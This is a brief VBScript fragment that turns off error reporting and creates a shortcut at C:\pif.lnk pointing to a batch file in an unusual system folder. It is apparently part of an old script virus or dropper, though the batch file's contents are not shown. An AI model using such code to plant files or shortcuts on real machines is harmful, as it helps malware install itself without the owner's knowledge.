on error resume next
dim wshs, msc
set wshs=Wscript.CreateObject("WScript.Shell")
set msc=wshs.CreateShortcut("C:\pif.lnk")
msc.TargetPath = wshs.ExpandEnvironmentStrings("c:\windows\system\ioana\ioana.bat")
msc.WindowStyle = 4
msc.Save
